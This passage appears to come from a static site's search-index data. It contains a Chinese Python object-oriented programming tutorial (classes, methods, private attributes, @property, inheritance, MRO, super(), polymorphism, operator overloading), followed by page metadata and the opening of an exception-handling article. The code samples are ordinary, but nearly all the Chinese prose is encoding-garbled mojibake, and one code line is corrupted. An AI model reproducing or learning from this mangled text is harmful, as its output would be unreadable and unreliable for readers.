å®ä¾å±æ§\n\nå®ä¾å±æ§æ¯ä»å±äºå®ä¾å¯¹è±¡çå±æ§ï¼ä¹ç§°ä¸ºå®ä¾åéãå®ä¾å±æ§ä¸è¬å¨initæ¹æ³ä¸­è¿è¡åå§åï¼å¯ä»¥éè¿self.å®ä¾å±æ§åè®¿é®å®ä¾å±æ§ï¼å¨åå»ºå®ä¾å¯¹è±¡ä¹åï¼å¯ä»¥éè¿å¯¹è±¡å.å®ä¾å±æ§åãä¹å¯ä»¥æ°æ·»å å±æ§ã\n\n# å®ä¾æ¹æ³\n\nå®ä¾æ¹æ³æ¯ä»å±äºå®ä¾å¯¹è±¡çæ¹æ³ï¼å®ä¾æ¹æ³å®ä¹æ¶ï¼ç¬¬ä¸ä¸ªåæ°å¿é¡»ä¸ºselfï¼åé¢çä¸ºå½¢ååè¡¨ãå¨è°ç¨å®ä¾æ¹æ³æ¶ï¼ä¸éè¦ä¹ä¸è½ç»selfä¼ éåæ°ï¼selfç±è§£éå¨èªå¨ä¼ éåæ°ãæ¹æ³çå®ä¹æ ¼å¼å¦ä¸æç¤ºï¼\n\ndef say_score(self,abc):\n  print(self.name,'åæ°æ¯ï¼',self.score)\n  print(abc)\n# è°ç¨æ¹å¼\n  s1 = student(\"zhangsan\",20)\n  s1.say_score(123) # zhangsan åæ°æ¯ï¼ 20 123\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¹æ³åå½æ°æä»ä¹åºå«ï¼\n\n * æ¹æ³åå½æ°é½æ¯ç¨æ¥å®æç¹å®åè½çä»£ç å\n * æ¹æ³éè¿å¯¹è±¡æ¥è°ç¨ï¼ä»å±äºä¸ä¸ªå®ä¾å¯¹è±¡ï¼èå½æ°ä¸ä¸æ ·\n * æ¹æ³å®ä¹æ¯éè¦ä¼ éselfåæ°ï¼å½æ°ä¸éè¦ã\n\nä¸äºå¸¸è§çæä½ï¼\n\nclass student:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n\n    def say_hello(self):\n        print(self.name,'hello')\n\n# è·åå¯¹è±¡çææå±æ§åæ¹æ³\ns = student(\"zhangsan\",12)\nprint(dir(s)) # ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name', 'say_hello']\n\nprint(s.__dict__) # {'name': 'zhangsan', 'age': 12}\n\npass # ç©ºè¯­å¥\n\nprint(isinstance(s, student)) # true  å¤æ­å¯¹è±¡æ¯ä¸æ¯ä¸ºæç§ç±»å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³\n\n# ç±»å¯¹è±¡\n\npythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼ç±»ä¹æ¯ï¼ç§°ä¸ºç±»å¯¹è±¡ï¼ä½¿ç¨classå³é®å­å®ä¹ã\n\nclass student:\n    pass\n\ns = student()\nprint(type(student)) # <class 'type'>\n\nprint(type(student())) # <class '__main__.student'>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ç±»å±æ§\n\nç±»å±æ§æ¯ä»å±äºç±»å¯¹è±¡çå±æ§ï¼ä¹ç§°ä¸ºç±»åéï¼å ä¸ºä»å±äºç±»å¯¹è±¡ï¼å æ­¤å¯ä»¥è¢«ææçå®ä¾å¯¹è±¡å±äº«ã\n\nç±»å±æ§çå®ä¹æ¹å¼ï¼\n\nclass student:\n    name = \"zhansgan\"\n\nprint(student.name) # zhansgan\n\n\n1\n2\n3\n4\n\n\nå¯ä»¥éè¿ç±»å.ç±»åéçæ¹å¼è®¿é®ã\n\n# ç±»æ¹æ³\n\nç±»æ¹æ³æ¯ä»å±äºç±»å¯¹è±¡çæ¹æ³ï¼ä½¿ç¨@classmethodå®ä¹ãç¬¬ä¸ä¸ªclsåæ°å¿é¡»è¦ä¼ éï¼ä»£è¡¨çæ¯ç±»å¯¹è±¡çæ¬èº«ãè°ç¨ç±»æ¹æ³çæ¹å¼æ¯ï¼ç±»å.ç±»æ¹æ³å(åæ°åè¡¨)ãåæ°åè¡¨ä¸­ï¼ä¸éè¦ä¼ éclså¼ãç±»æ¹æ³ä¸­è®¿é®å®ä¾å±æ§åå®ä¾æ¹æ³å¯¼è´éè¯¯ï¼å­ç±»ç»§æ¿ç¶ç±»æ¹æ³æ¶ï¼ä¼ å¥clsæ¶å­ç±»å¯¹è±¡ï¼èå¹¶éæ¯ç±»å¯¹è±¡ã\n\nclass student:\n    company = \"hello\"\n\n    @classmethod\n    def printconpany(cls):\n        print(cls.company)\n\nstudent.printconpany() # hello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# éææ¹æ³\n\npythonä¸­åè®¸å®ä¹åç±»å¯¹è±¡æ å³çæ¹æ³ï¼ç§°ä¸ºéææ¹æ³ãéææ¹æ³åæ®éå½æ°æ²¡æåºå«ï¼åªä¸è¿éææ¹æ³æ¾å°äºç±»çåå­ç©ºé´éé¢ï¼éè¦éè¿ç±»æ¥è°ç¨ãéææ¹æ³çè°ç¨æ ¼å¼ä¸ºï¼ç±»å.éææ¹æ³å(åæ°åè¡¨)ãéææ¹æ³ä¸­è®¿é®å®ä¾å±æ§åå®ä¾æ¹æ³ä¼æ¥éã\n\nclass student:\n    company = \"xxx\"\n\n    @staticmethod\n    def add(a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n        return a+b\n\nstudent.add(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# __del__æ¹æ³ååå¾åæ¶\n\n__del__æ¹æ³ç§°ä¸ºæææ¹æ³ï¼ç¨äºå®ç°å¯¹è±¡éæ¯æ¶æéè¦çæä½ãæ¯å¦éæ¾å¯¹è±¡èµæºç­ç­ãpythonå¯ä»¥å®ç°èªå¨çåå¾åæ¶æºå¶ï¼å½å¯¹è±¡æ²¡æè¢«å¼ç¨æ¶ï¼ç±åå¾åæ¶å¨è°ç¨__delââ_æ¹æ³ãæä»¬å¯ä»¥ä½¿ç¨delå é¤å¯¹è±¡ï¼è°ç¨__del__æ¹æ³ã\n\nclass person:\n    def __del__(self):\n        print(\"éæ¯å¯¹è±¡ï¼{0}\".format(self))\n\np1 = person()\np2 = person()\ndel p2\nprint(\"----\")\n\n\"\"\"\néæ¯å¯¹è±¡ï¼<__main__.person object at 0x7fd23000b5e0>\n----\néæ¯å¯¹è±¡ï¼<__main__.person object at 0x7fd23000be80>\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# __call__æ¹æ³åå¯è°ç¨å¯¹è±¡\n\nå®ç°äº__call__æ¹æ³çå¯¹è±¡ç§°ä¸ºå¯è°ç¨å¯¹è±¡ï¼å³è¯¥å¯¹è±¡å¯ä»¥è¢«åå½æ°ä¸æ ·è°ç¨ã\n\nclass calcutil:\n    def __call__(self,a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n\ns = calcutil()\ns(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æ¹æ³éè½½\n\nå¨pythonä¸­æ¹æ³æ²¡æéè½½ï¼å¶ä»è¯­è¨ä¸­ï¼å¯ä»¥å®ä¹å¤ä¸ªååçæ¹æ³ï¼åªè¦ä¿è¯æ¹æ³çç­¾åå¯ä¸å³å¯ãæ¹æ³çç­¾ååå«æ¹æ³åï¼åæ°æ°éååæ°ç±»åã\n\npythonä¸­ï¼æ¹æ³çåæ°æ²¡æå£°æåæ°ç±»åï¼åæ°çæ°éä¹å¯ä»¥ç±å¯ååæ°æ§å¶ãå æ­¤pythonä¸­ä¸å­å¨æ¹æ³éè½½ãå¦æå¨ç±»ä¸­å®ä¹äºå¤ä¸ªååæ¹æ³ï¼åªææåä¸ä¸ªæ¹æ³æ¯ææçã\n\nclass person:\n    def say(self):\n        print(\"hello1\")\n    def say(self):\n        print(\"hello2\")\n\np1 = person()\np1.say() # hello2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¹æ³çå¨ææ§\n\npythonæ¯ä¸ç§å¨æè¯­è¨ï¼æä»¬å¯ä»¥ç»ç±»æ·»å æ°çæ¹æ³ï¼æèå¨æçä¿®æ¹ç±»ç°æçä¸äºæ¹æ³ã\n\nclass person:\n    def work(self):\n        print(\"shangban\")\n\ndef play(self):\n        print(\"play\")\n\ndef work2(self):\n    print(\"work2\")\n\nperson.play_game = play\nperson.work = work2\n\np = person()\n\nprint(dir(p))\n\np.play_game() # play\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# ç§æå±æ§åç§ææ¹æ³\n\npythonå¯¹äºç±»çæåæ²¡æä¸¥æ ¼è®¿é®çæ§å¶éå¶ï¼è¿åå¶ä»çé¢åç¬äº«çè¯­è¨ææåºå«ãéå¸¸æåµä¸æä»¬çº¦å®ä¸¤ä¸ªä¸åçº¿å¼å¤´çå±æ§æ¯ç§æå±æ§ï¼å¶ä»çä¸ºå¬å±çãç±»åé¨å¯ä»¥è®¿é®ç§æå±æ§ï¼ç±»å¤é¨ä¸è½ç´æ¥è®¿é®ç§æçå±æ§ãç±»å¤é¨å¯ä»¥éè¿_ç±»å__ç§æå±æ§åè®¿é®ç§æå±æ§æèæ¹æ³ã\n\nclass employee:\n    __company = \"aaa\"\n\n    def __init__(self,name,age):\n        self.name = name\n        self.__age = age\n    def say_company(self):\n        print(\"æçå¬å¸æ¯ï¼\",employee.__company) # æçå¬å¸æ¯ï¼ aaa\n        print(self.name,\"çå¹´é¾æ¯\",self.__age) # zhangsan çå¹´é¾æ¯ 12\n        self.__work()\n\n    def __work(self):\n        print(\"work\") # work\n\ne1 = employee(\"zhangsan\",12)\nprint(e1.name)  # zhangsan\nprint(e1._employee__age) # 12\ne1.say_company()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# @propertyè£é¥°å¨\n\n@propertyå¯ä»¥å°ä¸ä¸ªæ¹æ³çè°ç¨åä¸ºå¯¹å±æ§çè°ç¨ã\n\nclass employee:\n\n    @property\n    def salary(self):\n        return 2000\n\nemp = employee()\nprint(emp.salary) # 2000\nprint(type(emp.salary)) # <class 'int'>\n\n# emp.salary() # typeerror: 'int' object is not callable\n\nemp.#salary = 200 # attributeerror: can't set attribute 'salary'\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n@propertyç¨äºå¸®å©æä»¬å¤çå±æ§çè¯»åæä½ï¼å¯¹äºå±æ§æä»¬å¯ä»¥ç´æ¥èµå¼çæ¹å¼è¯»åï¼ä½æ¯å¯¹äºä¸äºæ°æ®ï¼æä¸äºèå´çéå¶ï¼å¿é¡»éè¿setgetæ¹æ³æ¥è¿è¡åå¥åè¯»åã\n\nclass employee:\n\n    def __init__(self):\n        self.__salary = 0\n\n    @property\n    def salary(self):\n        return self.__salary\n\n    @salary.setter\n    def salary(self,salary):\n        if(0<salary<1000):\n            self.__salary = salary\n        else:\n            print(\"æ°æ®å¼å¸¸\")\n\nemp = employee()\nprint(emp.salary)\nemp.salary = 200\nprint(emp.salary) # 200\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# é¢åå¯¹è±¡çä¸å¤§ç¹å¾\n\npythonæ¯é¢åå¯¹è±¡çè¯­è¨ï¼æ¯æé¢åå¯¹è±¡çä¸å¤§ç¹å¾ï¼åå«æ¯å°è£ç»§æ¿åå¤æã\n\n * å°è£æ¯éèå¯¹è±¡çå±æ§åå®ç°çå·ä½ç»èï¼åªå¯¹å¤æä¾å¿è¦çæ¹æ³ï¼ç¸å½äºå°ç»èå°è£èµ·æ¥ï¼åªå¯¹å¤æ´é²ç¸å³çè°ç¨æ¹æ³ã\n * ç»§æ¿å¯ä»¥è®©å­ç±»å·æç¶ç±»çç¹æ§ï¼å¯ä»¥æé«ä»£ç çéç¨æ§\n * å¤ææçæ¯åä¸ä¸ªæ¹æ³è°ç¨å ä¸ºä¸åçå¯¹è±¡ä¼äº§çä¸åçè¡ä¸ºã\n\n\n# ç»§æ¿\n\nç»§æ¿æ¯é¢åå¯¹è±¡çä¸ä¸ªéè¦ç¹æ§ï¼ä¹æ¯å®ç°ä»£ç å¤ç¨çéè¦çææ®µãpythonä¸­å¯ä»¥å®ç°å¤éç»§æ¿ï¼ä¸ä¸ªå­ç±»å¯ä»¥ç»§æ¿å¤ä¸ªç¶ç±»ï¼å¦æå¨ç±»å®ä¹ä¸­æ²¡ææå®ç¶ç±»ï¼åé»è®¤æ¯ç»§æ¿objectç±»ï¼objecç±»æ¯ææçç±»çç¶ç±»ãå®ä¹å­ç±»æ¶å¿é¡»å¨æé å½æ°ä¸­è°ç¨ç¶ç±»çæé å½æ°ï¼è°ç¨æ¹å¼å¦ä¸ï¼ç¶ç±»å.__init___(self,åæ°åè¡¨)\n\nç¤ºä¾ä»£ç ï¼\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\ns1 = student(\"zhangsan\",12,1,100)\ns1.say_hello() # hello, zhangsan\nprint(dir(s1))\nprint(s1.name) # zhangsan\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# ç±»æåçç»§æ¿åéå\n\n 1. æåç»§æ¿ï¼å­ç±»å¯ä»¥ç»§æ¿ç¶ç±»é¤äºæé æ¹æ³ä»¥å¤çæææåã\n 2. æ¹æ³éåï¼å­ç±»å¯ä»¥éæ°å®ä¹ç¶ç±»ä¸­çæ¹æ³ï¼è¦çæåæ¬çç¶ç±»æ¹æ³ï¼ç§°ä¸ºéåã\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\ns1 = student(\"zhangsan\",12,1,100)\ns1.say_hello() # i am a student\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# æ¥çç±»çå±æ¬¡ç»æ\n\nå¯ä»¥éè¿ç±»æ¹æ³mro() æèç±»å±æ§__mro__è¾åºç±»çå±æ¬¡ç»æ\n\nclass person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass student(person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\nprint(student.mro()) # [<class '__main__.student'>, <class '__main__.person'>, <class 'object'>]\n\nprint(student.__mro__) # (<class '__main__.student'>, <class '__main__.person'>, <class 'object'>)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# objectç±»\n\nobjectç±»æ¯ææç±»çç¶ç±»ï¼objectä¸­çæ¹æ³å¨æ¯ä¸ªç±»ä¸­é½å­å¨ã\n\nå¯ä»¥éè¿dir()æ¥æ¥çå¯¹è±¡çå±æ§ï¼æä»¬å¯ä»¥éè¿dirå½æ°ï¼äº§çç½®é¡¶å¯¹è±¡ä¸­çææå±æ§ã\n\nå¨objectä¸­æä¸ä¸ª__str__()æ¹æ³ï¼è¯¥æ¹æ³ç¨äºè¿åä¸ä¸ªå¯¹è±¡çä¿¡æ¯ãç±»ä¼¼äºjavaä¸­çtostringæ¹æ³ã\n\nclass person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n\np = person()\nprint(p) # i am a person\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# å¤éç»§æ¿\n\nåjavaä¸ä¸æ ·ï¼pythonæ¯æ¯æå¤éç»§æ¿çï¼å æ­¤ä¸ä¸ªå­ç±»å¯ä»¥æå¤ä¸ªç´æ¥çç¶ç±»ãä½æ¯è¿æ ·çç»§æ¿æ¹å¼å¾å¾å¤ªå¤æï¼åºè¯¥å°½éçé¿åä½¿ç¨ã\n\n# mro()\n\npythonä¸­æ¯æå¤éç»§æ¿ï¼å¦æç¶ç±»ä¸­æç¸ååå­çæ¹æ³ï¼å¨å­ç±»ä¸­æ²¡ææå®ç¶ç±»åæ¶ï¼é»è®¤æç§ä»ååå³çé¡ºåºæç´¢ãmro(method resolution order)ï¼æ¹æ³çè§£æé¡ºåºã\n\n# super() è·å¾ç¶ç±»å®ä¹\n\nå¨å­ç±»ä¸­ï¼å¦ææ³è¦è·å¾æä¸ªç¶ç±»çæ¹æ³æ¶ï¼æä»¬å¯ä»¥éè¿superæ¥è°ç¨ï¼superä»£è¡¨çæ¯ç¶ç±»çå®ä¹ï¼èä¸æ¯ç¶ç±»çå¯¹è±¡ã\n\nclass person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n    def say(self):\n        print(\"say\")\n\nclass student(person):\n    def say(self):\n        print(\"student\")\n        super().say()\n\ns1 = student()\ns1.say()  # student say\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# å¤æ\n\nå¤ææçæ¯åä¸ä¸ªæ¹æ³å ä¸ºä¸éçå¯¹è±¡è°ç¨æäº§ççä¸åçè¡ä¸ºãå¤ææ¯æ¹æ³çå¤æï¼å¯¹äºå±æ§å¹¶æ²¡æå¤æï¼å¤ææä¸¤ä¸ªéè¦çæ¡ä»¶ï¼ä¸ä¸ªæ¯ç»§æ¿ï¼ä¸ä¸ªæ¯æ¹æ³çéåã\n\nclass animal:\n    def shout(self):\n        print(\"animal shout\")\n\nclass dog(animal):\n    def shout(self):\n        print(\"wang wang\")\n\nclass cat(animal):\n    def shout(self):\n        print(\"miaomiao\")\n\ndef animalshot(a):\n    if isinstance(a,animal):\n        a.shout()\n\nanimalshot(cat()) # miaomiao\nanimalshot(dog()) # wang wang \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# ç¹æ®æ¹æ³åè¿ç®ç¬¦éè½½\n\npythonä¸­çè¿ç®ç¬¦å®éä¸é½æ¯éè¿è°ç¨å¯¹è±¡çç¹æ®æ¹æ³å®ç°çã\n\na = 10\nb = 20\nc = a+b\nd = a.__add__(b)\nprint(c) # 30\nprint(d) # 30\n\n\n1\n2\n3\n4\n5\n6\n\n\npythonä¸äºç¹æ®çæ¹æ³ï¼\n\næ¹æ³                 è¯´æ      ä¾å­\n__init__           æé æ¹æ³    å¯¹è±¡åå»ºï¼p = person()\n__del__            æææ¹æ³    å¯¹è±¡åæ¶\n__repr__,__str__   æå°ï¼è½¬æ¢   print(a)\n__call__           å½æ°è°ç¨    a()\n__getattr__        ç¹å·è¿ç®    a.xxx\n__setattr__        å±æ§èµå¼    a.xxx = value\n__getitem__        ç´¢å¼è¿ç®    a[key]\n__setitem__        ç´¢å¼èµå¼    a[key]=value\n__len__            é¿åº¦      len(a)\n\nè¿ç®ç¬¦æå¯¹åºçç¹æ®çæ¹æ³å¦ä¸ï¼\n\nè¿ç®ç¬¦        ç¹æ®æ¹æ³                                       è¯´æ\nè¿ç®ç¬¦+       __add__                                    å æ³\nè¿ç®ç¬¦-       __sub__                                    åæ³\n<,<=,==    __lt__,__le__ï¼__eq__                       æ¯è¾è¿ç®ç¬¦\n>,>=,!=    __gt__,__ge__,__ne__                       \n|,^,&      __or__,__xor__,__and__                     æãå¼æãä¸\n<<,>>      __lshift__,__rshift__                      å·¦ç§»ãå³ç§»\n*,/,%,//   __mul__,__truediv__,__mod__,__floordiv__   ä¹ãæµ®ç¹é¤ãæ¨¡è¿ç® ï¼åä½ï¼ãæ´æ°é¤\n**         __pow__                                    ææ°è¿ç®\n\næä»¬å¯ä»¥éåä»¥ä¸çæ¹æ³å®ç°æ¹æ³çéè½½ï¼\n\nclass person:\n    def __init__(self,name):\n        self.name = name\n\n    def __add__(self, other):\n        if isinstance(other,person):\n            return \"{0} -- {1} \".format(self.name,other.name)\n        else:\n            return \"error\"\n\ns1 = person(\"zhangsan\")\ns2 = person(\"lisi\")\nprint(s1 + s2) # zhangsan -- lisi \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# ç¹æ®çå±æ§\n\npythonä¸­å¯¹è±¡åå«äºå¾å¤ä»¥ä¸åçº¿å¼å§åç»æçå±æ§ï¼è¿äºç¹æ®å±æ§å¸¸è§çå¦ä¸ï¼\n\nç¹æ®æ¹æ³                     å«ä¹\nobj.__dict__             å¯¹è±¡çå±æ§å­å¸\nobj.__class__            å¯¹è±¡æå±çç±»\nclass.__bases__          ç±»çåºç±»åç»ï¼å¤ç»§æ¿ï¼\nclass.__base__           ç±»çåºç±»\nclass.__mro__            ç±»å±æ¬¡ç»æ\nclass.__subclasses__()   å­ç±»åè¡¨\n\n# å¯¹è±¡çæ·±æµæ·è´\n\nå¨ä¸é¢æä»¬å¶å®å·²ç»æå°å¯¹è±¡çæ·±æµæ·è´çé®é¢ï¼æµæ·è´æ¶å¯¹è±¡åå«çå­å¯¹è±¡ä¸ä¼è¢«æ·è´ï¼æ·±æ·è´åæ·è´å­å¯¹è±¡ãpythonä¸­ä½¿ç¨copy.copy()å®ç°æµæ·è´ï¼ä½¿ç¨copy.deepcopy()å®ç°æ·±æ·è´ã",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonå¼å¸¸å¤ççé£äºäº",frontmatter:{title:"Pythonå¼å¸¸å¤ççé£äºäº",date:"2022-03-26T20:00:00.000Z",permalink:"/sec/dev/python/exception",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/05.Python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/05.Pythonå¼å¸¸å¤ççé£äºäº.md",key:"v-2968b3d4",path:"/sec/dev/python/exception/",headers:[{level:2,title:"Pythonå¼å¸¸å¤ç",slug:"pythonå¼å¸¸å¤ç",normalizedTitle:"pythonå¼å¸¸å¤ç",charIndex:280},{level:3,title:"try...exceptç»æ",slug:"try-exceptç»æ",normalizedTitle:"try...exceptç»æ",charIndex:295},{level:3,title:"returnè¯­å¥åå¼å¸¸å¤ç",slug:"returnè¯­å¥åå¼å¸¸å¤ç",normalizedTitle:"returnè¯­å¥åå¼å¸¸å¤ç",charIndex:1682},{level:2,title:"å¸¸è§å¼å¸¸æ±æ»",slug:"å¸¸è§å¼å¸¸æ±æ»",normalizedTitle:"å¸¸è§å¼å¸¸æ±æ»",charIndex:1762},{level:2,title:"withä¸ä¸æç®¡ç",slug:"withä¸ä¸æç®¡ç",normalizedTitle:"withä¸ä¸æç®¡ç",charIndex:3676},{level:2,title:"trackbackæ¨¡å",slug:"trackbackæ¨¡å",normalizedTitle:"trackbackæ¨¡å",charIndex:3925},{level:2,title:"èªå®ä¹å¼å¸¸ç±»",slug:"èªå®ä¹å¼å¸¸ç±»",normalizedTitle:"èªå®ä¹å¼å¸¸ç±»",charIndex:4377}],excerpt:'<h1 id="pythonå¼å¸¸æºå¶çé£äºäº"><a class="header-anchor" href="#pythonå¼å¸¸æºå¶çé£äºäº">#</a> Pythonå¼å¸¸æºå¶çé£äºäº</h1>\n<blockquote>\n<p>å¼å¸¸æ¯ç¨åºå¨è¿è¡è¿ç¨ä¸­ï¼ç±äºç¨æ·è¾å¥æèå¶ä»åå å¯¼è´çç¨åºä¸­åºç°çéæ­£å¸¸çè¿è¡ç°è±¡ãå¼å¸¸å¤çæ¯æç¨åºå¨åºç°é®é¢æ¶ä¾ç¶å¯ä»¥æ­£ç¡®çæ§è¡ä»£ç ï¼ä¸ä¼å ä¸ºå¼å¸¸èç»æ­¢ç¨åºè¿è¡ã</p>\n</blockquote>\n',headersStr:"Pythonå¼å¸¸å¤ç try...exceptç»æ returnè¯­å¥åå¼å¸¸å¤ç å¸¸è§å¼å¸¸æ±æ» withä¸ä¸æç®¡ç trackbackæ¨¡å èªå®ä¹å¼å¸¸ç±»",content:'# Pythonå¼å¸¸æºå¶çé£äºäº\n\n> å¼å¸¸æ¯ç¨åºå¨è¿è¡è¿ç¨ä¸­ï¼ç±äºç¨æ·è¾å¥æèå¶ä»åå å¯¼è´çç¨åºä¸­åºç°çéæ­£å¸¸çè¿è¡ç°è±¡ãå¼å¸¸å¤çæ¯æç¨åºå¨åºç°é®é¢æ¶ä¾ç¶å¯ä»¥æ­£ç¡®çæ§è¡ä»£ç ï¼ä¸ä¼å ä¸ºå¼å¸¸èç»æ­¢ç¨åºè¿è¡ã\n\nPythonä¸­å¼è¿äºå¾å¤ç¨æ¥æè¿°åå¤çå¼å¸¸çç±»ï¼ç§°ä¸ºå¼å¸¸ç±»ï¼å¼å¸¸ç±»å®ä¹ä¸­åå«äºè¯¥å¼å¸¸çä¿¡æ¯åå¤ççæ¹æ³ã\n\néå¯¹å¼å¸¸çå¤çæåº¦åå«ä¸¤ä¸ªæ¹å¼ï¼\n\n * æåºå¼å¸¸ï¼å¨æ§è¡ä¸ä¸ªæ¹æ³æ¶ï¼å¦æåçå¼å¸¸ï¼åè¿ä¸ªæ¹æ³çæä»£è¡¨è¯¥å¼å¸¸çä¸ä¸ªå¯¹è±¡ï¼åæ­¢æ§è¡å½åçæ§è¡è·¯å¾ï¼å¹¶æå¼å¸¸å¯¹è±¡æäº¤ç»è§£éå¨ã\n * æè·å¼å¸¸ï¼è§£éå¨è·å¾å°å¼å¸¸ä¹åï¼å¯»æ¾ç¸å³çä»£ç å¤çå¼å¸¸ã\n\n\n# Pythonå¼å¸¸å¤ç\n\n\n# try...exceptç»æ\n\ntry...exceptæ¯æå¸¸è§çå¼å¸¸å¤çæºå¶ï¼åJavaä¸­çtry...catchç±»ä¼¼ãç»æå¦ä¸ï¼\n\ntry:\n    a = 1/0\nexcept BaseException as e:\n    print(e) # division by zero\n\n\n1\n2\n3\n4\n\n\ntryååå«çå¯è½å¼åå¼å¸¸çä»£ç ï¼exceptåç¨äºæè·åå¤çåççå¼å¸¸ãæ§è¡çæ¶åï¼å¦ætryä¸­æ²¡æå¼åå¼å¸¸ï¼åä¸ä¼æ§è¡exceptä¸­çä»£ç ï¼å¦æå¼åäºå¼å¸¸ï¼åä¼è·³è¿å¼å¸¸åçè¯­å¥ï¼æ§è¡exceptä¸­çå¼å¸¸å¤çä»£ç ï¼å¤çå®æä¹åï¼ç»§ç»­è¿è¡try...exceptåç»­ä»£ç ã\n\nåæ¶ï¼å¦æä¸ä¸ªtryä¸­å¯è½åºç°å¤ä¸ªç±»åçå¼å¸¸ï¼å°±å¯ä»¥æ·»å å¤ä¸ªExceptionçexceptãå¦ä¸æç¤ºï¼\n\ntry:\n    a = input("è¯·è¾å¥è¢«é¤æ°ï¼")\n    b = input("è¯·è¾å¥é¤æ°ï¼")\n    c = float(a)/float(b)\n    print(c)\nexcept ZeroDivisionError:\n    print("é¤æ°ä¸è½ä¸º0")\nexcept TypeError:\n    print("é¤æ°åè¢«é¤æ°åºè¯¥ä¸ºæ°")\nexcept NameError:\n    print("åéä¸å­å¨")\nexcept BaseException as e:\n    print(e)\n    print(type(e))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\ntry...except...elseç»æä¸­å¢å äºä¸ä¸ªelseå¿«ï¼å¦ætryä¸­æ²¡ææåºå¼å¸¸ï¼åæ§è¡elseåï¼å¦ææ§è¡äºexceptåï¼å°±ä¸æ§è¡äºelseåã\n\ntry:\n    a = input("è¯·è¾å¥è¢«é¤æ°ï¼")\n    b = input("è¯·è¾å¥é¤æ°ï¼")\n    c = float(a)/float(b)\n    print(c)\nexcept ZeroDivisionError:\n    print("é¤æ°ä¸è½ä¸º0")\nexcept TypeError:\n    print("é¤æ°åè¢«é¤æ°åºè¯¥ä¸ºæ°")\nexcept NameError:\n    print("åéä¸å­å¨")\nexcept BaseException as e:\n    print(e)\n    print(type(e))\nelse:\n    print("aaa")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nTry...except...finallyç»æä¸­ï¼æ è®ºæ¯å¦åçå¼å¸¸é½ä¼æ§è¡finallyä¸­çè¯­å¥ï¼éå¸¸ç¨finallyä¸­çè¯­å¥ç¨æ¥éæ¾èµæºã\n\ntry:\n    a = input("hello")\n    b = input("world")\n    c = float(a)/float(b)\n    print(c)\nexcept BaseException as e:\n    print(e)\nelse:\n    print(c)\nfinally:\n    